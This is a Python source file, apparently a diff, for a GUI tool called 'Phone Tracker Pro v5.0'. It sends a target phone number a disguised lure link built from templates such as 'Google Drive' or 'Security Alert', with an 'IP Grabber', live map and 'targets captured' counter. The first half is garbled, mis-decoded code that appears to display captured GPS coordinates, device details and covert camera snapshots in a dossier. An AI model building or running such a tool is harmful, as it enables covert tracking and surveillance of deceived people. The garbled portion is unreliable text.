†††††††ਠ††††††††敨摡牥㴠挠歴䌮歔慌敢⡬慣摲‬整瑸昽鎟₡慃瑰牵⁥笣⭩紱†胢ₔ笠⹣敧⡴挧灡畴敲彤灩Ⱗ唧歮潮湷⤧≽‬潦瑮挽歴䌮歔潆瑮眨楥桧㵴戢汯≤‬楳敺ㄽ⤳਩††††††††敨摡牥瀮捡⡫湡档牯∽≷‬慰硤ㄽⰰ瀠摡㵹⤵ਊ††††††††‣牔⁹楤歳椠慭敧映物瑳‬桴湥搠捥摯⁥牦浯䨠体⁎慢敳㐶 †††††††椠⁦⁩‼敬⡮楤歳楟慭敧⥳਺††††††††††牴㩹 †††††††††††张桳睯楟杭挨牡Ɽ䤠慭敧漮数⡮楤歳楟慭敧孳嵩Ⱙ映鎟₸湓灡慃⁭笣⭩紱⤢ †††††††††攠捸灥⁴硅散瑰潩㩮 †††††††††††瀠獡ੳ††††††††汥晩挠朮瑥∨慢敳㐶楟慭敧⤢਺††††††††††牴㩹 †††††††††††椠灭牯⁴慢敳㐶愠⁳扟㐶‬潩愠⁳楟੯††††††††††††慲⁷‽季戢獡㙥弴浩条≥੝††††††††††††晩∠∬椠⁮慲㩷 †††††††††††††爠睡㴠爠睡献汰瑩∨∬‬⤱ㅛ੝††††††††††††浩彧楰⁬‽浉条⹥灯湥弨潩䈮瑹獥佉弨㙢⸴㙢搴捥摯⡥慲⥷⤩ †††††††††††猠癡彥慰桴㴠挠獡彥慰桴爮灥慬散∨樮潳≮‬≦筟⭩紱樮杰⤢ †††††††††††椠杭灟汩献癡⡥慳敶灟瑡ⱨ∠偊䝅Ⱒ焠慵楬祴㠽⤵ †††††††††††张桳睯楟杭挨牡Ɽ椠杭灟汩‬≦鿰뢓匠慮䍰浡⌠楻ㄫ⁽攨瑸慲瑣摥映潲⁭半乏銆笠慳敶灟瑡絨∩਩††††††††††硥散瑰䔠捸灥楴湯਺††††††††††††慰獳 †††††††ਠ††††††††湩潦㴠映吢浩㩥笠⹣敧⡴挧灡畴敲瑟浩❥‬✧紩湜ਢ††††††††摡牤㴠挠朮瑥✨瑳敲瑥慟摤敲獳Ⱗ✠⤧ †††††††椠⁦摡牤਺††††††††††湩潦⬠‽≦鿰趓笠摡牤屽≮ †††††††椠普⁯㴫映䐢癥捩㩥笠⹣敧⡴瀧慬晴牯❭‬✧紩簠䈠瑡整祲›捻朮瑥✨慢瑴牥❹‬✧紩簠丠瑥潷歲›捻朮瑥✨敮睴牯❫‬✧紩湜ਢ††††††††敷杢⁬‽⹣敧⡴眧扥汧牟湥敤敲❲‬✧਩††††††††晩眠扥汧਺††††††††††湩潦⬠‽≦假㩕笠敷杢絬簠䌠啐›捻朮瑥✨灣彵潣敲❳✬✿紩挠牯獥簠删䵁›捻朮瑥✨慲彭执Ⱗ㼧⤧䝽层≮ †††††††朠獰江瑡㴠挠朮瑥✨灧彳慬❴਩††††††††灧彳潬⁮‽⹣敧⡴朧獰江湯⤧ †††††††椠⁦灧彳慬⁴湡⁤灧彳潬㩮 †††††††††椠普⁯㴫映䜢卐›杻獰江瑡ⱽ笠灧彳潬絮⠠捁㩣笠⹣敧⡴朧獰慟捣牵捡❹✬⤧浽尩≮ †††††††††椠普⁯㴫映䴢灡㩳栠瑴獰⼺洯灡⹳潧杯敬挮浯㼯㵱杻獰江瑡ⱽ杻獰江湯屽≮ †††††††攠獬㩥 †††††††††椠普⁯㴫∠假㩓丠瑯挠灡畴敲層≮ †††††††椠普⁯㴫映䈢潲獷牥›捻朮瑥✨獵牥杁湥❴‬✧嬩㠺崰≽ †††††††ਠ††††††††硴⁴‽瑣⹫呃呫硥扴硯挨牡Ɽ栠楥桧㵴㘱⤰ †††††††琠瑸瀮捡⡫楦汬∽≸‬慰硤ㄽⰰ瀠摡㵹⤵ †††††††琠瑸椮獮牥⡴〢〮Ⱒ椠普⥯ †††††††琠瑸挮湯楦畧敲猨慴整∽楤慳汢摥⤢ਊ††††硥散瑰䔠捸灥楴湯愠⁳㩥 †††††攠牲㴠挠歴䌮歔慌敢⡬捳潲汬晟慲敭‬整瑸昽䔢牲牯爠慥楤杮挠獡㩥笠絥⤢ †††††攠牲瀮捡⡫慰祤㈽⤰ਊ††††‣硅潰瑲戠瑵潴⁮瑡戠瑯潴੭††††硥潰瑲扟湴㴠挠歴䌮歔畂瑴湯猨牣汯彬牦浡ⱥ琠硥㵴鎟₄硅潰瑲䐠獯楳牥䠠䵔≌‬杦损汯牯∽愣㑡〴∰ਬ†††††††††††††††††挠浯慭摮氽浡摢㩡猠汥⹦硥潰瑲摟獯楳牥挨獡彥慰桴⤩ †††攠灸牯彴瑢⹮慰正瀨摡㵹㔱਩ਊ††敤⁦硥潰瑲摟獯楳牥猨汥ⱦ挠獡彥慰桴㨩 †††椠灭牯⁴獪湯‬慢敳㐶‬敷扢潲獷牥 †††琠祲਺††††††楷桴漠数⡮慣敳灟瑡ⱨ✠❲‬湥潣楤杮✽瑵ⵦ✸ 獡映਺††††††††慤慴㴠樠潳⹮潬摡昨਩††††硥散瑰䔠捸灥楴湯愠⁳㩥 †††††爠瑥牵੮†††† †††挠灡畴敲⁳‽慤慴朮瑥∨慣瑰牵獥Ⱒ嬠⥝ †††椠杭桟浴⁬‽∢ †††椠杭灟瑡整湲㴠挠獡彥慰桴爮灥慬散∨樮潳≮‬弢⸪灪≧਩††††浩条獥㴠朠潬⹢汧扯椨杭灟瑡整湲਩††††晩椠慭敧㩳 †††††琠祲਺††††††††楷桴漠数⡮浩条獥ⵛ崱‬爢≢ 獡椠杭㩦 †††††††††戠㐶㴠戠獡㙥⸴㙢攴据摯⡥浩晧爮慥⡤⤩搮捥摯⡥਩††††††††浩彧瑨汭㴠映㰧浩⁧牳㵣搢瑡㩡浩条⽥灪来戻獡㙥ⰴ扻㐶≽猠祴敬∽慭⵸楷瑤㩨〳瀰㭸潢摲牥爭摡畩㩳瀸㭸潢摲牥㈺硰猠汯摩⌠晦㐴㐴∻㸯ਧ††††††硥散瑰䔠捸灥楴湯਺††††††††慰獳ਊ††††潲獷㴠∠ਢ††††潦⁲Ⱪ挠椠⁮湥浵牥瑡⡥慣瑰牵獥㨩 †††††愠摤⁲‽⹣敧⡴猧牴敥彴摡牤獥❳‬丧䄯⤧ †††††朠慭⁰‽∢ †††††椠⁦⹣敧⡴朧獰江瑡⤧愠摮挠朮瑥✨灧彳潬❮㨩 †††††††朠慭⁰‽❦愼栠敲㵦栢瑴獰⼺洯灡⹳潧杯敬挮浯㼯㵱捻≛灧彳慬≴絝第季朢獰江湯崢≽琠牡敧㵴弢汢湡≫猠祴敬∽潣潬㩲㐣晡㸢灏湥椠⁮潇杯敬䴠灡㱳愯✾ †††††爠睯⁳㴫映∢ਢ††††††琼㹲 †††††††㰠摴⌾楻ㄫ㱽琯㹤琼㹤捻朮瑥✨慣瑰牵摥楟❰✬⤧㱽琯㹤 †††††††㰠摴笾摡牤㱽牢笾浧灡㱽琯㹤 †††††††㰠摴笾⹣敧⡴戧瑡整祲Ⱗ✧紩簠䌠慨杲湩㩧笠⹣敧⡴挧慨杲湩❧✬⤧㱽琯㹤 †††††††㰠摴笾⹣敧⡴渧瑥潷歲Ⱗ✧紩⼼摴ਾ††††††††琼㹤捻朮瑥✨敷杢彬敲摮牥牥Ⱗ✧紩戼㹲偃㩕笠⹣敧⡴挧異损牯獥Ⱗ㼧⤧⁽⁼䅒㩍笠⹣敧⡴爧浡束❢✬✿紩䉇⼼摴ਾ††††††††琼㹤捻朮瑥✨慣瑰牵彥楴敭Ⱗ✧紩⼼摴ਾ††††††⼼牴∾∢ †††ਠ††††瑨汭㴠映∢㰢䐡䍏奔䕐栠浴㹬格浴㹬格慥㹤洼瑥⁡档牡敳㵴甧晴㠭㸧 †††㰠楴汴㹥潄獳敩⁲‭潻⹳慰桴戮獡湥浡⡥慣敳灟瑡⥨㱽琯瑩敬ਾ††††猼祴敬ਾ††††††潢祤筻慢正牧畯摮⌺搰搰搰挻汯牯⌺づづづ昻湯⵴慦業祬洺湯獯慰散瀻摡楤杮㈺瀰㭸絽 †††††栠笱捻汯牯⌺晦㐴㐴紻⁽㉨筻潣潬㩲愣晡慦㭡潢摲牥戭瑯潴㩭瀱⁸潳楬⁤㌣㌳瀻摡楤杮戭瑯潴㩭瀵㭸絽 †††††琠扡敬筻楷瑤㩨〱┰戻牯敤⵲潣汬灡敳挺汯慬獰㭥慭杲湩琭灯ㄺ瀰㭸絽 †††††琠筨扻捡杫潲湵㩤ㄣㅡ㉡㭥潣潬㩲㐣晡瀻摡楤杮㠺硰琻硥⵴污杩㩮敬瑦紻੽††††††摴筻潢摲牥ㄺ硰猠汯摩⌠㌳㬳慰摤湩㩧瀸㭸敶瑲捩污愭楬湧琺灯昻湯⵴楳敺ㄺ瀲㭸絽 †††††⸠湳灡慣筭瑻硥⵴污杩㩮散瑮牥瀻摡楤杮㈺瀰㭸潢摲牥ㄺ硰猠汯摩⌠慡㐴〰活牡楧㩮〲硰〠戻牯敤⵲慲楤獵㠺硰紻੽††††⼼瑳汹㹥⼼敨摡㰾潢祤ਾ††††格㸱鿰ꢚ传䥓呎䘠剏久䥓⁃佄卓䕉㱒栯㸱 †††㰠㹰慃敳䘠汩㩥㰠㹢潻⹳慰桴戮獡湥浡⡥慣敳灟瑡⥨㱽戯‾渦獢㭰♼扮灳※慔杲瑥›戼笾慤慴朮瑥✨慴杲瑥Ⱗ丧䄯⤧㱽戯㰾瀯ਾ††††❻搼癩挠慬獳∽湳灡慣≭㰾㉨鎟₸乓偁䅃⁍䅃呐剕㱅栯㸲‧‫浩彧瑨汭⬠✠⼼楤㹶‧晩椠杭桟浴⁬汥敳✠紧 †††㰠㉨䌾灡畴敲删捥牯獤⼼㉨ਾ††††琼扡敬㰾牴㰾桴⌾⼼桴㰾桴䤾㱐琯㹨琼㹨摁牤獥⁳ 慍㱰琯㹨琼㹨慂瑴牥㱹琯㹨琼㹨敎睴牯㱫琯㹨琼㹨慈摲慷敲⼼桴㰾桴吾浩㱥琯㹨⼼牴ਾ††††牻睯絳⼼慴汢㹥 †††㰠戯摯㹹⼼瑨汭∾∢ਊ††††畯彴慰桴㴠挠獡彥慰桴爮灥慬散∨樮潳≮‬弢潤獳敩⹲瑨汭⤢ †††眠瑩⁨灯湥漨瑵灟瑡ⱨ∠≷‬湥潣楤杮∽瑵ⵦ∸ 獡映畯㩴 †††††映畯⹴牷瑩⡥瑨汭਩††††敷扢潲獷牥漮数⡮畯彴慰桴਩ਊ††敤⁦汰瑯慟汬损獡獥猨汥⥦਺††††楦敬⁳‽汧扯朮潬⡢漢瑵異⽴⸪獪湯⤢ †††椠⁦潮⁴楦敬㩳 †††††爠瑥牵੮††††敳晬洮灡睟摩敧⹴敤敬整慟汬浟牡敫⡲਩††††汰瑯整⁤‽ਰ††††潦⁲⁦湩映汩獥਺††††††牴㩹 †††††††眠瑩⁨灯湥昨‬爧Ⱗ攠据摯湩㵧甧晴㠭⤧愠⁳晪਺††††††††††慤慴㴠樠潳⹮潬摡樨⥦ †††††††映牯挠椠⁮慤慴朮瑥∨慣瑰牵獥Ⱒ嬠⥝਺††††††††††慬⁴‽⹣敧⡴朢獰江瑡⤢ †††††††††氠湯㴠挠朮瑥∨灧彳潬≮਩††††††††††灩㴠挠朮瑥∨慣瑰牵摥楟≰‬㼢⤢ †††††††††栠獡獟慮⁰‽潢汯挨朮瑥∨慢敳㐶楟慭敧⤢਩††††††††††晩氠瑡愠摮氠湯਺††††††††††††慬敢⁬‽≦鿰뒔笠灩≽†‣敒⁤‽假⁓潣普物敭੤††††††††††汥敳਺††††††††††††灩楟㴠挠朮瑥∨灩楟普≯‬絻਩††††††††††††慬⁴‽灩楟朮瑥∨潬≣‬Ⱒ⤢献汰瑩∨∬嬩崰 †††††††††††氠湯癟㴠椠彰⹩敧⡴氢捯Ⱒ∠∬⸩灳楬⡴Ⱒ⤢ㅛ⁝晩∠∬椠⁮灩楟朮瑥∨潬≣‬Ⱒ⤢攠獬⁥潎敮 †††††††††††椠⁦慬⁴湡⁤潬彮㩶 †††††††††††††氠瑡‬潬⁮‽汦慯⡴慬⥴‬汦慯⡴潬彮⥶ †††††††††††††氠扡汥㴠映龟₡楻絰•⌠夠汥潬⁷‽偉漠汮੹††††††††††††汥敳਺††††††††††††††潣瑮湩敵 †††††††††琠祲਺††††††††††††敳晬洮灡睟摩敧⹴敳彴慭歲牥昨潬瑡氨瑡Ⱙ映潬瑡氨湯Ⱙ琠硥㵴慬敢⥬ †††††††††††瀠潬瑴摥⬠‽਱††††††††††硥散瑰䔠捸灥楴湯਺††††††††††††慰獳 †††††攠捸灥⁴硅散瑰潩㩮 †††††††瀠獡ੳ††††晩瀠潬瑴摥㸠〠਺††††††敳晬琮扡楶睥献瑥∨楌敶䴠灡⤢ †††猠汥⹦灡数摮瑟硥⡴≦湜鞟辸䴠偁⁝汐瑯整⁤灻潬瑴摥⁽楨瑳牯捩污挠灡畴敲⹳湜⤢ਊ †搠晥挠敬牡浟灡猨汥⥦਺††††敳晬洮灡睟摩敧⹴敤敬整慟汬浟牡敫⡲਩††††敳晬洮灡睟摩敧⹴敳彴潰楳楴湯〨‬⤰ †††猠汥⹦慭彰楷杤瑥献瑥穟潯⡭⤲ਊ †搠晥氠慯彤楨瑳牯⡹敳晬㨩 †††映牯眠摩敧⁴湩猠汥⹦楨瑳牯役牦浡⹥楷普彯档汩牤湥⤨਺††††††楷杤瑥搮獥牴祯⤨ †††ਠ††††晩渠瑯漠⹳慰桴攮楸瑳⡳漢瑵異≴㨩 †††††氠㴠挠歴䌮歔慌敢⡬敳晬栮獩潴祲晟慲敭‬整瑸∽潎挠獡獥映畯摮∮਩††††††⹬慰正瀨摡㵹〱਩††††††敲畴湲 †††††ਠ††††楦敬⁳‽汧扯朮潬⡢漢瑵異⽴⸪獪湯⤢ †††椠⁦潮⁴楦敬㩳 †††††氠㴠挠歴䌮歔慌敢⡬敳晬栮獩潴祲晟慲敭‬整瑸∽潎猠慣⁮敲潰瑲⁳潦湵⹤⤢ †††††氠瀮捡⡫慰祤ㄽ⤰ †††††爠瑥牵੮†††††† †††映牯映椠⁮敲敶獲摥猨牯整⡤楦敬ⱳ欠祥漽⹳慰桴朮瑥瑭浩⥥㨩 †††††戠獡湥浡⁥‽獯瀮瑡⹨慢敳慮敭昨਩††††††瑭浩⁥‽獯瀮瑡⹨敧浴楴敭昨਩††††††瑤獟牴㴠搠瑡瑥浩⹥慤整楴敭昮潲瑭浩獥慴灭洨楴敭⸩瑳晲楴敭✨搥┭ⵢ夥┠㩈䴥⤧ †††††ਠ††††††牦浡⁥‽瑣⹫呃䙫慲敭猨汥⹦楨瑳牯役牦浡⥥ †††††映慲敭瀮捡⡫楦汬∽≸‬慰祤㔽‬慰硤㔽਩††††††扬⁬‽瑣⹫呃䱫扡汥昨慲敭‬整瑸昽鎟₌扻獡湥浡⹥敲汰捡⡥⸧獪湯Ⱗ✧紩†⁼鎟₅摻彴瑳絲⤢ †††††氠汢瀮捡⡫楳敤∽敬瑦Ⱒ瀠摡㵸〱‬楦汬∽≸਩††††††瑢⁮‽瑣⹫呃䉫瑵潴⡮牦浡ⱥ琠硥㵴嘢敩⁷慃敳Ⱒ眠摩桴㠽ⰰ挠浯慭摮氽浡摢⁡㵸㩦猠汥⹦楶睥损獡⡥⥸਩††††††瑢⹮慰正猨摩㵥爢杩瑨Ⱒ瀠摡㵸〱‬慰祤㔽਩ †搠晥张捳湡晟湩獩敨⡤敳晬㨩 †††猠汥⹦灡数摮瑟硥⡴尢孮剐䍏卅⁓䕔䵒义呁䑅屝≮਩††††敳晬献慴瑲扟瑵潴⹮潣普杩牵⡥瑳瑡㵥渢牯慭≬਩††††敳晬献潴彰畢瑴湯挮湯楦畧敲猨慴整∽楤慳汢摥⤢ †††猠汥⹦瑳瑡獟慴畴⹳潣普杩牵⡥整瑸∽鿰ꆛ룯₏奓呓䵅›䙏䱆义≅‬整瑸损汯牯∽牧祡⤢ †††猠汥⹦潬摡桟獩潴祲⤨ਊ††敤⁦瑳牡彴捳湡猨汥⥦਺††††桰湯⁥‽敳晬瀮潨敮敟瑮祲朮瑥⤨献牴灩⤨ †††椠⁦潮⁴桰湯㩥 †††††猠汥⹦灡数摮瑟硥⡴嬢剅佒嵒倠敬獡⁥湥整⁲⁡慴杲瑥瀠潨敮渠浵敢⹲湜⤢ †††††爠瑥牵੮ †††猠汥⹦瑳牡彴畢瑴湯挮湯楦畧敲猨慴整∽楤慳汢摥⤢ †††猠汥⹦瑳灯扟瑵潴⹮潣普杩牵⡥瑳瑡㵥渢牯慭≬਩††††敳晬挮湯潳敬瑟硥扴硯挮湯楦畧敲猨慴整∽潮浲污⤢ †††猠汥⹦潣獮汯彥整瑸潢⹸敤敬整∨⸰∰‬攢摮⤢ †††猠汥⹦潣獮汯彥整瑸潢⹸潣普杩牵⡥瑳瑡㵥搢獩扡敬≤਩††††敳晬瀮潲牧獥⹳敳⡴⸰⤱ਊ††††敳晬愮灰湥彤整瑸昨匢慴瑲湩⁧牴捡楫杮映牯笠桰湯絥⸮尮≮਩††††桴敲摡湩⹧桔敲摡琨牡敧㵴敳晬弮畲彮湩整湲污‬牡獧⠽桰湯ⱥⰩ搠敡潭㵮牔敵⸩瑳牡⡴਩ †搠晥猠潴彰捳湡猨汥⥦਺††††敳晬愮灰湥彤整瑸∨湜卛佔偐义⁇剐䍏卅⹓⸮屝≮਩††††祳⹳硥瑩〨਩ †搠晥甠摰瑡彥慭⡰敳晬‬慬ⱴ氠湯㨩 †††搠晥张潤畟摰瑡⡥㨩 †††††琠祲਺††††††††敳晬洮灡睟摩敧⹴敳彴潰楳楴湯昨潬瑡氨瑡Ⱙ映潬瑡氨湯⤩ †††††††猠汥⹦慭彰楷杤瑥献瑥穟潯⡭㈱਩††††††††敳晬洮灡睟摩敧⹴敳彴慭歲牥昨潬瑡氨瑡Ⱙ映潬瑡氨湯Ⱙ琠硥㵴吢牡敧≴਩††††††硥散瑰਺††††††††慰獳 †††猠汥⹦晡整⡲ⰰ张潤畟摰瑡⥥ਊ††敤⁦牟湵楟瑮牥慮⡬敳晬‬桰湯⥥਺††††浩潰瑲椠੯††††浩潰瑲猠獹 †††椠灭牯⁴桰湯彥牴捡敫ੲ††††牦浯甠楮瑴獥⹴潭正椠灭牯⁴慰捴੨††††浩潰瑲琠慲散慢正 †††ਠ††††‣浉敭楤瑡⁥敤畢⁧瑡猠慴瑲 †††猠汥⹦晡整⡲ⰰ猠汥⹦灡数摮瑟硥ⱴ∠䑛䉅䝕ㄠ⁝牟湵楟瑮牥慮⁬瑳牡整層≮਩†††† †††挠慬獳䜠䥕瑓敲浡椨⹯瑓楲杮佉㨩 †††††搠晥张楟楮彴⡟敳晬‬灡⥰਺††††††††畳数⡲⸩彟湩瑩彟⤨ †††††††猠汥⹦灡⁰‽灡ੰ††††††敤⁦牷瑩⡥敳晬‬瑳楲杮㨩 †††††††椠⁦瑳楲杮਺††††††††††牴㩹 †††††††††††猠汥⹦灡⹰晡整⡲ⰰ猠汥⹦灡⹰灡数摮瑟硥ⱴ猠牴湩⥧ †††††††††攠捸灥㩴 †††††††††††瀠獡ੳ†††† †††猠牴慥⁭‽啇卉牴慥⡭敳晬਩††††敳晬愮瑦牥〨‬敳晬愮灰湥彤整瑸‬嬢䕄啂⁇崲匠牴慥⁭牣慥整層≮਩†††† †††琠祲਺††††††敳晬愮瑦牥〨‬敳晬愮灰湥彤整瑸‬≦䑛䉅䝕㌠⁝桰湯彥牴捡敫⁲潭畤敬氠慯敤⁤牦浯›灻潨敮瑟慲正牥弮晟汩彥絟湜⤢ †††††ਠ††††††牡癧㴠嬠瀢潨敮瑟慲正牥瀮≹‬桰湯嵥 †††††椠⁦敳晬漮晦捩牥敟瑮祲朮瑥⤨献牴灩⤨਺††††††††牡癧攮瑸湥⡤≛ⴭ景楦散≲‬敳晬漮晦捩牥敟瑮祲朮瑥⤨献牴灩⤨⥝ †††††椠⁦敳晬挮獡彥湥牴⹹敧⡴⸩瑳楲⡰㨩 †††††††愠杲⹶硥整摮嬨ⴢ挭獡≥‬敳晬挮獡彥湥牴⹹敧⡴⸩瑳楲⡰崩਩††††††晩猠汥⹦畱捩彫慶⹲敧⡴㨩 †††††††愠杲⹶灡数摮∨ⴭ畱捩≫਩††††††晩猠汥⹦牧扡敢彲慶⹲敧⡴㨩 †††††††愠杲⹶灡数摮∨ⴭ牧扡⤢ਊ††††††獯攮癮物湯≛䕔偍䅌䕔䍟佈䍉≅⁝‽敳晬琮浥汰瑡彥慶⹲敧⡴਩††††††獯攮癮物湯≛䱐奁卟問䑎崢㴠∠∱椠⁦敳晬献畯摮慟敬瑲癟牡朮瑥⤨攠獬⁥〢ਢ††††††獯攮癮物湯≛久䉁䕌卟䅎䍐䵁崢㴠∠∱椠⁦敳晬献慮捰浡癟牡朮瑥⤨攠獬⁥〢ਢ †††††猠汥⹦晡整⡲ⰰ猠汥⹦灡数摮瑟硥ⱴ映嬢䕄啂⁇崴匠瑥楴杮甠⁰慣汬慢正ⱳ愠杲㵶慻杲絶湜⤢ †††††ਠ††††††桰湯彥牴捡敫⹲束極浟灡畟摰瑡⁥‽敳晬甮摰瑡彥慭ੰ††††††晩猠汥⹦敷桢潯彫湥牴⹹敧⡴⸩瑳楲⡰㨩 †††††††漠⹳湥楶潲孮䐢卉佃䑒坟䉅佈䭏崢㴠猠汥⹦敷桢潯彫湥牴⹹敧⡴⸩瑳楲⡰਩†††††† †††††猠汥⹦晡整⡲ⰰ猠汥⹦灡数摮瑟硥ⱴ∠䑛䉅䝕㔠⁝扁畯⁴潴挠污⁬桰湯彥牴捡敫⹲慭湩⤨湜⤢ †††††ਠ††††††楷桴瀠瑡档∨祳⹳瑳潤瑵Ⱒ猠牴慥⥭‬慰捴⡨猢獹愮杲≶‬牡癧㨩 †††††††映潲⁭楲档挮湯潳敬椠灭牯⁴潃獮汯੥††††††††桰湯彥牴捡敫⹲潣獮汯⁥‽潃獮汯⡥楦敬猽牴慥Ɑ映牯散瑟牥業慮㵬慆獬ⱥ挠汯牯獟獹整㵭潎敮਩††††††††桰湯彥牴捡敫⹲慭湩⤨ †††††††ਠ††††††敳晬愮瑦牥〨‬敳晬愮灰湥彤整瑸‬嬢䕄啂⁇崶洠楡⡮ 潣灭敬整⁤潮浲污祬湜⤢ †††攠捸灥⁴硅散瑰潩⁮獡攠਺††††††扴㴠琠慲散慢正昮牯慭彴硥⡣਩††††††敳晬愮瑦牥〨‬敳晬愮灰湥彤整瑸‬≦湜䕛䍘偅䥔乏⁝敻屽≮਩††††††敳晬愮瑦牥〨‬敳晬愮灰湥彤整瑸‬≦呛䅒䕃⁝瑻絢湜⤢ †††映湩污祬਺††††††敳晬愮瑦牥〨‬敳晬弮捳湡晟湩獩敨⥤ਊ晩张湟浡彥 㴽∠彟慭湩彟㨢 †愠灰㴠䄠灰⤨ †愠灰洮楡汮潯⡰਩
+import customtkinter as ctk
+import subprocess
+import threading
+import sys
+import os
+import glob
+import json
+import datetime
+import tkintermapview
+
+ctk.set_appearance_mode("Dark")  # Modes: "System" (standard), "Dark", "Light"
+ctk.set_default_color_theme("blue")  # Themes: "blue" (standard), "green", "dark-blue"
+
+class App(ctk.CTk):
+    def __init__(self):
+        super().__init__()
+
+        self.title("Phone Tracker Pro v5.0 - Intelligence UI")
+        self.geometry("1000x800")
+        self.grid_columnconfigure(1, weight=1)
+        self.grid_rowconfigure(0, weight=1)
+
+        # Sidebar
+        self.sidebar_frame = ctk.CTkFrame(self, width=200, corner_radius=0)
+        self.sidebar_frame.grid(row=0, column=0, sticky="nsew")
+        self.sidebar_frame.grid_rowconfigure(6, weight=1)
+
+        self.logo_label = ctk.CTkLabel(self.sidebar_frame, text="Tracker Pro", font=ctk.CTkFont(size=20, weight="bold"))
+        self.logo_label.grid(row=0, column=0, padx=20, pady=(20, 10))
+
+        self.phone_label = ctk.CTkLabel(self.sidebar_frame, text="Target Number (+CC):")
+        self.phone_label.grid(row=1, column=0, padx=20, pady=(10, 0), sticky="w")
+        self.phone_entry = ctk.CTkEntry(self.sidebar_frame, placeholder_text="+1234567890")
+        self.phone_entry.grid(row=2, column=0, padx=20, pady=(0, 10), sticky="ew")
+
+        self.officer_label = ctk.CTkLabel(self.sidebar_frame, text="Officer / Webhook:")
+        self.officer_label.grid(row=3, column=0, padx=20, pady=(10, 0), sticky="w")
+        self.officer_entry = ctk.CTkEntry(self.sidebar_frame, placeholder_text="OPERATOR-1")
+        self.officer_entry.grid(row=4, column=0, padx=20, pady=(0, 10), sticky="ew")
+
+        self.case_label = ctk.CTkLabel(self.sidebar_frame, text="Case ID:")
+        self.case_label.grid(row=5, column=0, padx=20, pady=(10, 0), sticky="nw")
+        self.case_entry = ctk.CTkEntry(self.sidebar_frame, placeholder_text="CASE-XXXX")
+        self.case_entry.grid(row=6, column=0, padx=20, pady=(0, 10), sticky="nw")
+
+        self.grabber_var = ctk.BooleanVar(value=False)
+        self.grabber_checkbox = ctk.CTkCheckBox(self.sidebar_frame, text="Enable IP Grabber", variable=self.grabber_var)
+        self.grabber_checkbox.grid(row=7, column=0, padx=20, pady=(10, 10), sticky="w")
+
+        self.quick_var = ctk.BooleanVar(value=False)
+        self.quick_checkbox = ctk.CTkCheckBox(self.sidebar_frame, text="Quick Mode", variable=self.quick_var)
+        self.quick_checkbox.grid(row=8, column=0, padx=20, pady=(10, 10), sticky="w")
+
+        self.template_var = ctk.StringVar(value="Standard Offer")
+        self.template_dropdown = ctk.CTkOptionMenu(self.sidebar_frame, 
+                                                 values=["Standard Offer", "YouTube Video", "Google Drive", "Instagram", "WhatsApp", "Delivery Tracking", "Security Alert"], 
+                                                 variable=self.template_var)
+        self.template_dropdown.grid(row=9, column=0, padx=20, pady=(10, 10), sticky="ew")
+
+        self.start_button = ctk.CTkButton(self.sidebar_frame, text="START SCAN", command=self.start_scan, fg_color="red", hover_color="darkred")
+        self.start_button.grid(row=10, column=0, padx=20, pady=20, sticky="ew")
+
+        self.stop_button = ctk.CTkButton(self.sidebar_frame, text="STOP", command=self.stop_scan, fg_color="gray", state="disabled")
+        self.stop_button.grid(row=11, column=0, padx=20, pady=(0, 20), sticky="ew")
+
+        # Main frame with Tabs
+        self.tabview = ctk.CTkTabview(self)
+        self.tabview.grid(row=0, column=1, padx=20, pady=20, sticky="nsew")
+        
+        self.tabview.add("Dashboard")
+        self.tabview.add("Live Map")
+        self.tabview.add("Case History")
+        self.tabview.add("Settings")
+
+        # Dashboard Tab
+        self.tabview.tab("Dashboard").grid_rowconfigure(1, weight=1)
+        self.tabview.tab("Dashboard").grid_columnconfigure(0, weight=1)
+        
+        # Stat Cards
+        self.stats_frame = ctk.CTkFrame(self.tabview.tab("Dashboard"), fg_color="transparent")
+        self.stats_frame.grid(row=0, column=0, sticky="ew", padx=10, pady=5)
+        self.stats_frame.grid_columnconfigure((0,1,2), weight=1)
+        
+        self.stat_status = ctk.CTkLabel(self.stats_frame, text=" SYSTEM: OFFLINE", font=ctk.CTkFont(weight="bold", size=14), text_color="gray")
+        self.stat_status.grid(row=0, column=0)
+        
+        self.stat_targets = ctk.CTkLabel(self.stats_frame, text=" TARGETS CAPTURED: 0", font=ctk.CTkFont(weight="bold", size=14), text_color="cyan")
+        self.stat_targets.grid(row=0, column=1)
+        
+        self.stat_latest = ctk.CTkLabel(self.stats_frame, text=" LATEST: N/A", font=ctk.CTkFont(weight="bold", size=14), text_color="orange")
+        self.stat_latest.grid(row=0, column=2)
+        
+        self.console_textbox = ctk.CTkTextbox(self.tabview.tab("Dashboard"), font=ctk.CTkFont(family="Consolas", size=12))
+        self.console_textbox.grid(row=1, column=0, sticky="nsew", padx=10, pady=5)
+        self.console_textbox.insert("0.0", "Welcome to Phone Tracker Pro v5.0\nWaiting for commands...\n")
+        self.console_textbox.configure(state="disabled")
+
+        self.progress = ctk.CTkProgressBar(self.tabview.tab("Dashboard"), progress_color="red")
+        self.progress.grid(row=2, column=0, sticky="ew", padx=10, pady=(0, 10))
+        self.progress.set(0)
+
+        # Tracking Link Row
+        self.link_frame = ctk.CTkFrame(self.tabview.tab("Dashboard"), fg_color="transparent")
+        self.link_frame.grid(row=3, column=0, sticky="ew", padx=10, pady=(0, 10))
+        self.link_frame.grid_columnconfigure(1, weight=1)
+
+        self.link_label = ctk.CTkLabel(self.link_frame, text="Tracking Link:", font=ctk.CTkFont(weight="bold"))
+        self.link_label.grid(row=0, column=0, padx=(0, 10))
+
+        self.link_entry = ctk.CTkEntry(self.link_frame, placeholder_text="Waiting for link...", height=35)
+        self.link_entry.grid(row=0, column=1, sticky="ew")
+        
+        self.copy_btn = ctk.CTkButton(self.link_frame, text=" COPY ", width=60, height=35, command=self.copy_link, fg_color="#2244aa")
+        self.copy_btn.grid(row=0, column=2, padx=(10, 0))
+
+        # Live Map Tab
+        self.tabview.tab("Live Map").grid_rowconfigure(1, weight=1)
+        self.tabview.tab("Live Map").grid_columnconfigure(0, weight=1)
+
+        map_controls = ctk.CTkFrame(self.tabview.tab("Live Map"), fg_color="transparent")
+        map_controls.grid(row=0, column=0, sticky="ew", padx=10, pady=5)
+        self.plot_all_btn = ctk.CTkButton(map_controls, text=" Plot All Cases", width=150, command=self.plot_all_cases, fg_color="#2244aa")
+        self.plot_all_btn.pack(side="left", padx=5)
+        self.clear_map_btn = ctk.CTkButton(map_controls, text=" Clear Map", width=120, command=self.clear_map, fg_color="#555")
+        self.clear_map_btn.pack(side="left", padx=5)
+        
+        self.map_widget = tkintermapview.TkinterMapView(self.tabview.tab("Live Map"), corner_radius=0)
+        self.map_widget.grid(row=1, column=0, sticky="nsew")
